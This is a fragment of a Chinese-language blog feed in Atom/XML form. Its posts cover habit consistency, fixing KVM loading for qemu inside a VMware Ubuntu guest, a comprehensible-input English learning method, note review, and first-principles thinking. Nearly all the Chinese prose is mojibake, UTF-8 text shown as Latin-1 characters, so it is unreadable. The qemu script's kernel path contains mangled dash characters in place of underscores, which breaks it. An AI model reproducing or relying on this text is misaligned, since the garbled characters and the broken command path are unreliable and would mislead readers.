    <title>åšæŒä¸æ‡ˆåŠ©åŠ›æˆåŠŸ</title>
    <link href="/cn/public_writing/"/>
    <url>/cn/public_writing/</url>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯ä¸€åˆ™ç¬”è®°ï¼Œå¯¹åšæŒä¸æ‡ˆçš„å¤šä¸ªæ–¹é¢è¿›è¡Œäº†é˜è¿°ã€‚ä»æ–¹æ³•ä¸Šè®²ï¼Œæœ€é‡è¦çš„æ˜¯è¦å°†é•¿æœŸç›®æ ‡å’Œå¯è§çš„è¿›æ­¥ç»“åˆåœ¨ä¸€èµ·ï¼Œè¿™æ ·æ‰èƒ½åšæŒå»åšä¸€äº›äº‹æƒ…ã€‚</p><h2 id="åšæŒä¸æ‡ˆï¼ˆConsistencyï¼‰çš„é‡è¦æ€§"><a href="#åšæŒä¸æ‡ˆï¼ˆConsistencyï¼‰çš„é‡è¦æ€§" class="headerlink" title="åšæŒä¸æ‡ˆï¼ˆConsistencyï¼‰çš„é‡è¦æ€§"></a>åšæŒä¸æ‡ˆï¼ˆConsistencyï¼‰çš„é‡è¦æ€§</h2><p>è™½ç„¶åŠ¨æœºå¯èƒ½ä¼šç‚¹ç‡ƒå†™ä½œæˆ–ä»»ä½•å…¶ä»–åˆ›é€ æ€§æ´»åŠ¨çš„å…´è¶£ç«èŠ±ï¼Œä½†çœŸæ­£ç‚¹ç‡ƒæˆåŠŸä¹‹ç«çš„æ˜¯æŒç»­æ€§ã€‚</p><ul><li>æ„å»ºä¹ æƒ¯ï¼šåšæŒä¸æ‡ˆæœ‰åˆ©äºä¹ æƒ¯çš„å»ºç«‹ã€‚ä¹ æƒ¯ä¸€æ—¦å»ºç«‹ï¼Œå°†å½¢æˆè‡ªåŠ¨çš„è¡Œä¸ºï¼Œéœ€è¦æ›´å°‘çš„åŠªåŠ›ä¿æŒè¡Œä¸ºæ¨¡å¼ï¼ŒåŒæ—¶æ›´åŠ è‡ªç„¶å¹¶äº«å—å…¶ä¸­çš„è¿‡ç¨‹</li><li>é€æ­¥æé«˜ï¼šæŒç»­ç»ƒä¹ å¯ä»¥å¸¦æ¥é€æ­¥çš„æé«˜ï¼Œæ¯æ¬¡ç»ƒä¹ å¯èƒ½è·å¾—ä¸€ä¸ªå¾ˆå°çš„è¿›æ­¥ï¼Œä½†æ‹‰é•¿æ—¶é—´çœ‹ï¼Œå¾®å°çš„è¿›æ­¥ä¼šç§¯ç´¯æˆæ˜¾è‘—çš„è¿›æ­¥</li><li>ä¿æŒåŠ¨åŠ›ï¼šåšæŒä¸æ‡ˆæœ‰åŠ©äºä¿æŒåŠ¨åŠ›ã€‚å®šæœŸå‚åŠ ç»ƒä¹ å¯ä»¥ä¸æ–­è·å¾—çµæ„Ÿï¼Œå¹¶å½¢æˆè‚Œè‚‰è®°å¿†ï¼Œæ˜¾è‘—å‡å°å¼€å§‹ç»ƒä¹ æ—¶çš„é˜»åŠ›ã€‚</li><li>è¾¾åˆ°é•¿æœŸç›®æ ‡ï¼šæˆåŠŸé€šå¸¸æ˜¯é•¿æœŸæŒç»­åŠªåŠ›çš„ç»“æœã€‚åšæŒä¸æ‡ˆå°†æ—¥å¸¸è¡ŒåŠ¨å’Œé•¿æœŸç›®æ ‡ç»“åˆèµ·æ¥ï¼Œåˆ›å»ºä¸€æ¡é€šå¾€æˆåŠŸä¹‹è·¯ã€‚</li></ul><h2 id="åšæŒä¸æ‡ˆçš„æŒ‘æˆ˜"><a href="#åšæŒä¸æ‡ˆçš„æŒ‘æˆ˜" class="headerlink" title="åšæŒä¸æ‡ˆçš„æŒ‘æˆ˜"></a>åšæŒä¸æ‡ˆçš„æŒ‘æˆ˜</h2><ul><li>å…‹æœæ‹–å»¶ç—‡ï¼šæ‹–å»¶æ˜¯åšæŒä¸æ‡ˆæœ€å¤§çš„éšœç¢ï¼Œåˆ¶å®šä¸€ä¸ªæœ‰è§„å¾‹çš„æ—¶é—´è®¡åˆ’è¡¨ï¼Œåˆ›é€ ä¸€ä¸ªæœ‰åˆ©çš„ç¯å¢ƒï¼Œéƒ½æœ‰åŠ©äºå…‹æœæ‹–å»¶è¿™ä¸€æŒ‘æˆ˜</li><li>å¤„ç†å€¦æ€ ï¼šåšæŒä¸æ‡ˆå¹¶ä¸æ˜¯ä¸ä¼‘æ¯ï¼Œå¹³è¡¡çš„ç”Ÿæ´»æ˜¯é˜²æ­¢å€¦æ€ çš„å…³é”®ï¼Œä¼‘æ¯å’Œå……ç”µä¸å¥‹åŠ›å‘å‰åŒæ ·é‡è¦</li><li>ç®¡ç†é¢„æœŸï¼šå¹¶ä¸æ˜¯æ¯ä¸€æ¬¡ç»ƒä¹ éƒ½å¯ä»¥è·å¾—ä¸°ç¡•çš„æˆæœï¼Œæ‹¥æŠ±ä¸å®Œç¾ï¼Œä¸è¦å¤ªè¿‡å…³æ³¨ç›´æ¥çš„æˆæœï¼Œè¿™æ ·æ‰èƒ½å’ŒåšæŒä¸æ‡ˆçš„åŠªåŠ›å»ºç«‹å¥åº·çš„å…³ç³»ã€‚</li></ul><h2 id="ä¿æŒåšæŒä¸æ‡ˆçš„ç­–ç•¥"><a href="#ä¿æŒåšæŒä¸æ‡ˆçš„ç­–ç•¥" class="headerlink" title="ä¿æŒåšæŒä¸æ‡ˆçš„ç­–ç•¥"></a>ä¿æŒåšæŒä¸æ‡ˆçš„ç­–ç•¥</h2><ul><li>è®¾å®šç°å®çš„ç›®æ ‡ï¼š å°†é•¿æœŸç›®æ ‡åˆ†è§£æˆè¾ƒå°çš„ã€å¯å®ç°çš„é˜¶æ®µæ€§ç›®æ ‡ï¼Œæ³¨é‡å–å¾—çš„è¿›æ­¥è€Œéè¿‡ç¨‹å®Œç¾</li><li>åˆ›å»ºä¾‹ç¨‹ï¼šåˆ›å»ºå›ºå®šçš„ä¾‹ç¨‹ï¼Œåˆ›å»ºä¿æŒåšæŒä¸æ‡ˆçš„æ—¥å¸¸å®‰æ’</li><li>å¯»æ±‚è´£ä»»æ„Ÿï¼šå’Œæœ‹å‹åˆ†äº«ä½ çš„ç›®æ ‡æˆ–è€…åŠ å…¥ç¾¤ç»„ï¼Œä»åˆ«äººé‚£é‡Œè·å¾—é¼“åŠ±å’Œè´£ä»»æ„Ÿ</li><li>åº†ç¥è¿›æ­¥ï¼šè®¤å¯å¹¶åº†ç¥å–å¾—çš„è¿›æ­¥ï¼Œå“ªæ€•æ˜¯å¾®å°çš„è¿›æ­¥ï¼Œä¹Ÿèƒ½äº§ç”Ÿç§¯æçš„æ­£åé¦ˆï¼Œæ¿€å‘ç»§ç»­å‰è¿›çš„åŠ¨åŠ›</li></ul><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://addyosmani.com/blog/write-learn/">https://addyosmani.com/blog/write-learn/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VMware Workstation Windows 10 host Ubuntu 18.04 Guest ä¸­åŠ è½½ Linux å†…æ ¸ kvm æ¨¡å—</title>
    <link href="/cn/qemu_kvm/"/>
    <url>/cn/qemu_kvm/</url>
    
    <content type="html"><![CDATA[<p>è¿™é‡Œåœ¨ VMware Workstation Guset OS é‡Œä½¿ç”¨ qemu çš„ç”¨æ³•ï¼Œæœ‰ç‚¹åƒä¿„ç½—æ–¯å¥—å¨ƒã€‚</p><p>qemu.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">qemu-system-x86_64 \<br>  -m 2G \<br>  -smp 2 \<br>  -kernel <span class="hljs-variable">$KERNEL</span>/arch/x86â€”â€”64/boot/bzImage \<br>  -append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \<br>  -drive file=<span class="hljs-variable">$IMAGE</span>/bullseye.img,format=raw \<br>  -net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>  -net nic,model=e1000 \<br>  -enable-kvm \<br>  -nographic \<br>  -pidfile vm.pid \<br>  2&gt;&amp;1 | <span class="hljs-built_in">tee</span> vm.log<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå‘½ä»¤å <code>bash ./qemu.sh</code> åæŠ¥é”™</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">Could not access KVM kernel module: No such file or directory. <br>qemu-system-x86_64: failed to initialize KVM: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="è§£å†³-failed-to-initialize-KVM-é”™è¯¯"><a href="#è§£å†³-failed-to-initialize-KVM-é”™è¯¯" class="headerlink" title="è§£å†³ failed to initialize KVM é”™è¯¯"></a>è§£å†³ failed to initialize KVM é”™è¯¯</h2><p><code>lsmod | grep -i kvm</code> å‘ç°æ²¡æœ‰åŠ è½½ kvm å†…æ ¸æ¨¡å—</p><p>ä½¿ç”¨ kvm-ok æ£€æŸ¥å…·ä½“æƒ…å†µã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo /usr/sbin/kvm-ok<br><br>INFO: Your CPU does not support KVM extension<br>KVM acceleration can NOT be used<br></code></pre></td></tr></table></figure><p>é¦–å…ˆæ£€æŸ¥ VMware Workstation çš„è®¾ç½®ï¼Œå‘ç°å¤„ç†å™¨æ²¡æœ‰å‹¾é€‰è™šæ‹ŸåŒ–ç›¸å…³çš„è®¾ç½®ã€‚</p><ul><li>å…³æœºï¼Œè°ƒæ•´ VMware è®¾ç½®ï¼Œè®¾ç½® -&gt; ç¡¬ä»¶ -&gt; å¤„ç†å™¨ -&gt; è™šæ‹ŸåŒ–å¼•æ“ -&gt; é€‰æ‹© è™šæ‹ŸåŒ– Intel VT-x &#x2F; EPT æˆ– AMD-V &#x2F; RVI</li></ul><p>é‡æ–°æ‰“å¼€ Ubuntu Guest è™šæ‹ŸæœºæŠ¥é”™ <code>æ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„Intel VT-x/EPT</code></p><h2 id="è§£å†³æ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„Intel-VT-x-EPT"><a href="#è§£å†³æ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„Intel-VT-x-EPT" class="headerlink" title="è§£å†³æ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„Intel VT-x&#x2F;EPT"></a>è§£å†³æ­¤å¹³å°ä¸æ”¯æŒè™šæ‹ŸåŒ–çš„Intel VT-x&#x2F;EPT</h2><p>é¦–å…ˆæ£€æŸ¥ BIOS çš„è®¾ç½®æ˜¯å¦æ­£ç¡®ï¼Œä»»åŠ¡å³é”®æ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ -&gt; æ€§èƒ½ -&gt; CPU å³ä¸‹è§’ï¼Œè™šæ‹ŸåŒ–ï¼šå·²å¯ç”¨ï¼Œè¯´æ˜ BIOS è®¾ç½®æ²¡æœ‰é—®é¢˜ã€‚</p><p>ç½‘ç»œä¸Šçš„èµ„æ–™è¯´éœ€è¦ç¦ç”¨ Hyper-Vï¼Œä½¿ç”¨å‘½ä»¤è¡Œçš„æ–¹æ³•æ¯”è¾ƒæ–¹ä¾¿ã€‚</p><ul><li>ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€ CMD æ‰§è¡Œå‘½ä»¤ <code>bcdedit /set hypervisorlaunchtype off</code> å…³é—­ hypervisorlaunchtypeï¼Œé‡å¯ç³»ç»Ÿ</li></ul><p>é‡æ–°æ‰§è¡Œ <code>/usr/sbin/kvm-ok</code> æ˜¾ç¤ºä¸€åˆ‡æ­£å¸¸</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">INFO:</span> <span class="hljs-keyword">/dev/</span>kvm exists<br>KVM acceleration can be used<br></code></pre></td></tr></table></figure><p><code>egrep &quot;vmx|svm&quot; /proc/cpuinfo</code> åŒ¹é… vmxï¼Œ<code>lsmod | grep -i kvm</code> æ˜¾ç¤ºåŠ è½½äº† <code>kvm_intel</code> å’Œ <code>kvm</code> å†…æ ¸æ¨¡å—ã€‚</p><p>é‡æ–°éªŒè¯ Ubuntu Guest é‡Œ qemu æ˜¯å¦æ­£å¸¸å·¥ä½œï¼Œæ‰§è¡Œæ‰§è¡Œ qemu.shï¼ŒæŠ¥é”™ <code>Could not access KVM kernel module: Permission denied</code></p><h2 id="è§£å†³-failed-to-initialize-KVM-Permission-denied"><a href="#è§£å†³-failed-to-initialize-KVM-Permission-denied" class="headerlink" title="è§£å†³ failed to initialize KVM: Permission denied"></a>è§£å†³ failed to initialize KVM: Permission denied</h2><p>çœ‹ä¸Šå»æ˜¯æƒé™é—®é¢˜ï¼Œå°†å½“å‰ç”¨æˆ·æ·»åŠ åœ¨ kvm ç»„ï¼Œ<code>sudo usermod -a -G kvm &quot;test&quot;</code>ï¼Œé‡å¯ç³»ç»Ÿï¼Œæ‰§è¡Œ <code>bash ./qemu.sh</code> æˆåŠŸå¯åŠ¨</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">early <span class="hljs-built_in">console</span> in setup code<br>early <span class="hljs-built_in">console</span> in extract_kerne<br>...<br></code></pre></td></tr></table></figure><p>æ­¤æ–‡æ¡£å¯èƒ½æœ‰ä¸å®Œå¤‡ä¹‹å¤„ï¼Œåç»­ä¼šç»§ç»­æ›´æ–°æ­¤æ–‡æ¡£ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.xda-developers.com/disable-hyper-v-windows-11/">https://www.xda-developers.com/disable-hyper-v-windows-11/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>comprehensible input  è‹±è¯­å­¦ä¹ æ–¹æ³•</title>
    <link href="/cn/learning_english/"/>
    <url>/cn/learning_english/</url>
    
    <content type="html"><![CDATA[<p>youtube ä¸Šæœ‰ youtuber åœ¨ä¸å‡ºå›½çš„æƒ…å†µä¸‹ï¼Œå°†ç¬¬äºŒå¤–è¯­å­¦ä¹ åˆ°æ¯è¯­è€…æ°´å¹³çš„æˆåŠŸæ¡ˆä¾‹ã€‚</p><p>Makoto æ˜¯ä¸€ä½ä¼šè¯´ä¸­æ—¥è‹±ä¸‰é—¨è¯­è¨€çš„ Youtuberï¼Œä»–æ€»ç»“è‡ªå·±å­¦ä¹ ç¬¬äºŒå¤–è¯­çš„æˆåŠŸç»éªŒï¼Œå¯ä»¥ç®€å•åœ°å½’çº³æˆä¸€å¥è¯ï¼šæŒæ¡ç¬¬äºŒå¤–è¯­æœ€é‡è¦çš„æ˜¯å¿…é¡»æœ‰å¤§é‡åœ°é“çš„ comprehensible input (å¯ç†è§£çš„è¾“å…¥)ã€‚</p><p>Comprehensible input æ˜¯ Stephen D. Krashen æå‡ºçš„è¯­è¨€ä¹ å¾—å‡è¯´ï¼Œå¼ºè°ƒè¯­è¨€å­¦ä¹ æ˜¯è·å¾—çš„ï¼Œè€Œä¸æ˜¯é€šè¿‡å­¦ä¹ å¾—åˆ°çš„ã€‚å¬åŠ›æˆ–è€…é˜…è¯»è·å–çš„å†…å®¹éƒ½å¯ä»¥æ˜¯æœ‰æ•ˆçš„è¾“å…¥ï¼Œè·å–å†…å®¹çš„è¯­è¨€éš¾åº¦å¿…é¡»ç•¥é«˜äºå­¦ä¹ è€…çš„æ°´å¹³ã€‚</p><p>å¤šå¤§çš„åœ°é“è¯­è¨€è¾“å…¥é‡æ‰æ˜¯åˆé€‚çš„ ï¼ŸMakoto æ¨èçš„æ—¶é•¿ä¸º 1 ä¸ªå°æ—¶ï¼Œ30 åˆ†é’Ÿåä¼‘æ¯ 5 åˆ†é’Ÿï¼Œç„¶åå†ç»§ç»­ä¸‹ä¸€ä¸ª 30 åˆ†é’Ÿçš„å­¦ä¹ ã€‚</p><p>Youtuber Makoto comprehensible input è‹±è¯­å­¦ä¹ å…·ä½“æ­¥éª¤ï¼š<br>1ï¼‰ä½¿ç”¨ä¼ ç»Ÿçš„å­¦ä¹ æ–¹æ³•ï¼ŒæŒæ¡ 2000 ä¸ªå•è¯<br>2ï¼‰åœ¨ youtube ä¸Šçœ‹è§†é¢‘ï¼Œæ‰“å¼€å­—å¹•è¾¹çœ‹è¾¹å¬ï¼Œæ¥å—ä¸€äº›æä¸æ‡‚çš„å†…å®¹ (å¦‚æœå¤§é‡å•è¯ä¸è®¤è¯†å°±æ”¾å¼ƒ)<br>3ï¼‰åœ¨ youtube ä¸Šçœ‹è§†é¢‘ï¼Œå¦‚æœéš¾åº¦ä¸å¤Ÿ (èƒ½å¬æ‡‚ 80%ä»¥ä¸Š)ï¼Œå°±æé«˜éš¾åº¦<br>4ï¼‰å°†å£è¯­ç»ƒä¹ æ”¾åˆ°æœ€åçš„æ­¥éª¤ï¼Œåªæœ‰è¾“å…¥å¤Ÿäº†ï¼Œæ‰èƒ½è¯´å‡ºåœ°é“çš„å¤–è¯­</p><p>ä»ç†è§£å†…å®¹åˆ°æµåˆ©åœ°è¯´è¿˜æœ‰ä¸€æ®µè·ç¦»ï¼ŒMakoto ä½¿ç”¨çš„æ–¹æ³•æ˜¯ä»˜è´¹çœŸäººèŠå¤©ï¼Œç®—æ˜¯æ¯”è¾ƒå¸¸è§„çš„æ–¹æ³•ã€‚è¯¦ç»†å†…å®¹å¯ä»¥å‚è€ƒåŸè§†é¢‘ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>KNOWLEDGE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®šæœŸå›é¡¾ç¬”è®°çš„å¥½å¤„</title>
    <link href="/cn/note_review/"/>
    <url>/cn/note_review/</url>
    
    <content type="html"><![CDATA[<p>å°‘æ¥ åœ¨ ã€Šç¬”è®°çš„æ–¹æ³•ã€‹ä¸­ä»‹ç»äº†ä¸€ç§ ã€Œé€šè¿‡å›é¡¾æŒç»­åˆºæ¿€ã€çš„ç¬”è®°æŠ€æœ¯ï¼Œæˆ‘ä»¥å‰æ›¾ç®€ç§°ä¸ºã€Œæ¼«æ¸¸ç¬”è®°ã€æŠ€æœ¯ã€‚</p><p>å®šæœŸå›é¡¾è‡ªå·±çš„ç¬”è®°å¤§ä½“æœ‰ä¸‹é¢å‡ ä¸ªå¥½å¤„ï¼š</p><ul><li>å¯¹æŠ—é—å¿˜æ›²çº¿ï¼šå°¤å…¶æ˜¯é˜…è¯»ä¹¦ç±&#x2F;æ–‡ç« æ—¶æ‰€åšçš„ç¬”è®°ï¼Œæ–°å­¦çš„çŸ¥è¯†ä¹Ÿå®¹æ˜“é—å¿˜</li><li>æ¨åŠ¨çŸ¥è¯†å†…åŒ–ï¼Œæƒ³æ³•è¿­ä»£ï¼šçŸ¥è¯†ç»“æ„ä¼˜åŒ–ï¼Œæ–°æ—§çŸ¥è¯†è¿æ¥</li><li>é‡è§è¿‡å»çš„è‡ªå·±ï¼šåæ€ä»¥å‰çš„è‡ªå·±ï¼Œå›å¿†ä»¥å‰çš„è¶£äº‹ï¼ˆæŒºå¥½ç©ï¼ŒæŒºæœ‰è¶£ï¼‰</li><li>å½±å“ç°å®ï¼šä¿ƒè¿›è‡ªæˆ‘å®¡è§†ï¼Œæä¾›æ€è·¯å’Œçº¿ç´¢</li></ul><p>å¯¹æŠ—é—å¿˜æ›²çº¿ï¼šæˆ‘ä»¬å¯èƒ½é—å¿˜ç¬”è®°çš„å†…å®¹ï¼Œæ—¶é—´è¶Šä¹…è¿œçš„ç¬”è®°å†…å®¹å°±è¶Šå®¹æ˜“å¿˜è®°ã€‚äººçš„æ€ç»´ã€è¡Œä¸ºã€ä¹ æƒ¯å…·æœ‰æƒ¯æ€§ï¼Œè§‚å¿µã€æ€ç»´ã€æ–¹æ³•å¹¶ä¸å®¹æ˜“æ”¹å˜ï¼Œå¿…é¡»ä¸æ–­æé†’è‡ªå·±ã€‚</p><p>çŸ¥è¯†å†…åŒ–ï¼šå­æ›°ã€Œæ¸©æ•…è€ŒçŸ¥æ–°ï¼Œå¯ä»¥ä¸ºå¸ˆçŸ£ã€, å›é¡¾ç¬”è®°æä¾›äº†å†æ¬¡å­¦ä¹ çš„æœºä¼šï¼Œä¸æ–­åŠ æ·±å¯¹çŸ¥è¯†çš„ç†è§£ï¼Œä¹Ÿèƒ½ä¿ƒè¿›æ–°çš„æ´è§çš„äº§ç”Ÿã€‚</p><p>æƒ³æ³•è¿­ä»£ï¼šå›é¡¾ç¬”è®°æ˜¯ç”¨æ–°è§†è§’å»å®¡è§†æ—§æƒ³æ³•ï¼Œä¸€æ®µæ—¶é—´åé‡æ¸©è‡ªå·±æŸä¸ªæ—¶åˆ»çš„æƒ³æ³•ï¼Œå¯èƒ½ä»¥å‰çš„ç–‘æƒ‘ç°åœ¨å·²ç»æ²¡æœ‰äº†ï¼Œä¹Ÿå¯èƒ½ç°åœ¨å¯¹æŸä¸ªé—®é¢˜æœ‰äº†æ–°æ€è·¯ã€‚æ€»ä½“æ¥è¯´äººæ˜¯ä¼šä¸æ–­è¿›æ­¥çš„ï¼Œè¿™æ˜¯ä¿ƒä½¿æƒ³æ³•è¿­ä»£çš„ä¸€ç§æ–¹æ³•ã€‚</p><p>å½±å“ç°å®ï¼šå¦‚æœä½ é•¿æœŸå…³æ³¨ç‰¹å®šçš„é¢†åŸŸï¼Œä»¥å‰çš„ç¬”è®°å¯èƒ½ç»™ä½ ç°åœ¨åšçš„äº‹æä¾›æ€è·¯å’Œçº¿ç´¢ï¼Œå¹¸è¿çš„è¯ï¼Œèƒ½è¿¸å‘å‡ºæ–°çš„çµæ„Ÿã€‚å›é¡¾ç¬”è®°æä¾›äº†è¿‡å»å’Œç°åœ¨è¿æ¥çš„æœºä¼šã€‚ç°åœ¨æ˜¯å¦å…·å¤‡å®è·µçš„æœºä¼šï¼Ÿç¬”è®°ä¸­çš„æ€è·¯ã€æ–¹æ³•ã€çŸ¥è¯†éƒ½å·²ç»æˆåŠŸåº”ç”¨äº†å—ï¼Ÿè®¡åˆ’æ˜¯å¦å¦‚æœŸå®Œæˆï¼Ÿé”™è¯¯æ˜¯å¦å·²ç»çº æ­£ï¼Ÿ</p><p>å¦è¯šåœ°é¢å¯¹è¿‡å»çš„è‡ªå·±ï¼Œå›åˆ°ç°å®ï¼Œå¯èƒ½ä½ å°†è¿æ¥å´­æ–°çš„è‡ªå·±ã€‚</p><p>å‚è€ƒï¼š<a href="https://www.usmacd.com/cn/note/">https://www.usmacd.com/cn/note/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>PKM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¸‡ç»´é’¢è°ˆç¬¬ä¸€æ€§åŸç†</title>
    <link href="/cn/diyixingyuanli/"/>
    <url>/cn/diyixingyuanli/</url>
    
    <content type="html"><![CDATA[<p>ä¼Šéš†Â·é©¬æ–¯å…‹è§£é‡Š ç¬¬ä¸€æ€§åŸç†ï¼Œæˆ‘ä»¬æ€è€ƒè€é—®é¢˜ï¼Œä¸ä¸€å®šéœ€è¦ä½¿ç”¨ç±»æ¯”æ€ç»´è€ƒè™‘å‰äººçš„åšæ³•ï¼Œç›´æ¥ä»æœ€åŸºæœ¬çš„åŸç†å‡ºå‘ï¼Œå¯èƒ½ä¼šæ‰¾åˆ°å…¨æ–°çš„åŠæ³•ã€‚åˆ›ä¸šè€…è¯´ç¬¬ä¸€æ€§åŸç†ï¼Œç²¾ç¥çš„ä¸»æ—¨ä¸ºã€ŒæŠ›å¼€æˆè§ï¼Œæ‹’ç»å¥—è·¯ã€ï¼Œå›åˆ°æœ€åŸºæœ¬çš„é™åˆ¶æ¡ä»¶ï¼Œé‡æ–°è®¤è¯†å’Œè§£å†³é—®é¢˜ã€‚</p><p>é©¬æ–¯å…‹ä½¿ç”¨ç¬¬ä¸€æ€§åŸç†è®¡ç®—ç”µæ± ä»·å€¼çš„ä¾‹å­ï¼Œå¯èƒ½ä¸å¤ªæ­£ç¡®ã€‚ç”µæ± çš„æ ¹æœ¬ä»·å€¼ï¼Œé‡è¦çš„ä¸æ˜¯ç»„æˆå®ƒçš„ææ–™ï¼Œè€Œæ˜¯ææ–™çš„ç»“åˆæ–¹å¼ - å‡ç»“åœ¨å®ƒèº«ä¸Šçš„ä¿¡æ¯ã€‚ç”µæ± èº«ä¸Šçš„ä¿¡æ¯ï¼Œæ˜¯æŠ€æœ¯å’Œä¸“åˆ©ï¼Œè¿™æ˜¯å‡ ä»£äººæ™ºæ…§çš„ç»“æ™¶ã€‚</p><p>ä»ç‰©ç†å­¦ä¸Šè¯´ï¼Œæ‰€è°“ç¬¬ä¸€æ€§åŸç†ï¼Œæ˜¯æœ€åŸºæœ¬çš„ç‰©ç†å®šå¾‹ã€‚æ•°å­¦å­¦ç§‘çš„æ‰€æœ‰å†…å®¹éƒ½æ˜¯å»ºç«‹åœ¨ç¬¬ä¸€æ€§åŸç†ä¸Šçš„ï¼Œä»å‡ æ¡å…¬ç†å‡ºå‘ï¼Œæ¨å¯¼å‡ºå„ç§å®šå¾‹ï¼Œæ‰€ä»¥æ•°å­¦æ˜¯ç™¾åˆ†ä¹‹ç™¾æ­£ç¡®çš„å­¦ç§‘ã€‚</p><p>ä»ç¬¬ä¸€æ€§åŸç†å‡ºå‘åšè®¡ç®—ï¼Œæœ‰æ—¶å€™é—®é¢˜å¤ªå¤æ‚äº†ï¼Œç§‘å­¦å®¶ä¸èƒ½ä½¿ç”¨ç¬¬ä¸€æ€§åŸç†æ—¶ï¼Œé€šå¸¸æœ‰ä¸¤ä¸ªè§£æ³•æ–¹æ³•ï¼š<br>1ï¼‰æŠŠé—®é¢˜ç®€åŒ–ï¼Œåšä¸€äº›åŸºæœ¬å‡è®¾ï¼Œå¿½ç•¥ä¸€äº›ã€Œæ¬¡è¦ã€æ¡ä»¶ï¼Œè¿™äº›å‡è®¾æ„æˆä¸€ä¸ªæ¨¡å‹ï¼ŒåŸºäºæ¨¡å‹çš„è®¡ç®—ï¼Œç»“æœå¯èƒ½é”™è¯¯<br>2ï¼‰æ·¡åŒ–è®¡ç®—ï¼Œå€ŸåŠ©å†å²ç»éªŒï¼ˆå®éªŒï¼‰ï¼Œæ¯”å¦‚åŒ–å­¦å’Œææ–™ç§‘å­¦ï¼Œå¤§é‡çš„çŸ¥è¯†æ˜¯å®éªŒç§¯ç´¯çš„ç»“æœï¼Œä¸æ˜¯è°ä»åŸºæœ¬ç‰©ç†å®šå¾‹ç®—å‡ºæ¥</p><p>æ¨¡å‹å’Œç»éªŒæ—¢ç„¶ä¸æ˜¯ä»ç¬¬ä¸€æ€§åŸç†å‡ºå‘çš„ï¼Œå°±æœ‰å¯èƒ½æ˜¯é”™çš„ï¼Œå°±æœ‰è¢«æ”¹è¿›çš„ä½™åœ°ï¼Œå°†æ¥å°±æœ‰å¯èƒ½è¢«å–ä»£ã€‚è€Œå–ä»£å®ƒä»¬çš„ï¼Œå¾€å¾€æ˜¯æ›´å¥½çš„â€¦â€¦æ¨¡å‹å’Œç»éªŒã€‚</p><p>é©¬æ–¯å…‹çš„ç²¾ç¥æ˜¯å¯¹çš„ï¼Œæˆ‘ä»¬ä¸åº”è¢«å‰äººçš„ç»éªŒæŸç¼šï¼Œåº”è¯¥æ”¹é©å’Œåˆ›æ–°ã€‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“ï¼Œä»€ä¹ˆæƒ…å†µä¸‹å¿½ç•¥å‰äººçš„ç»éªŒæ‰æ˜¯ç†æ€§çš„è¡Œä¸ºã€‚<br>1ï¼‰æœ‰äº†æ–°çš„å·¥å…·ï¼šæ¯”å¦‚æœ‰æ–°çš„å·¥å…·è®©ä½ å¯¹äº‹ç‰©æœ‰äº†å…¨æ–°çš„ç†è§£æˆ–æ›´æ·±çš„ç†è§£<br>2ï¼‰ç¯å¢ƒå˜äº†ï¼šæ¯”å¦‚ä»Šå¤©çš„åŸºç¡€è®¾æ–½ã€åŸææ–™ä»·æ ¼ã€æ¶ˆè´¹è€…çŠ¶å†µå’Œä»¥å‰æœ‰é‡å¤§å·®åˆ«ï¼Œè€ä¸€å¥—çš„æ–¹æ³•ä¸ä½¿ç”¨äº†ï¼Œä½ 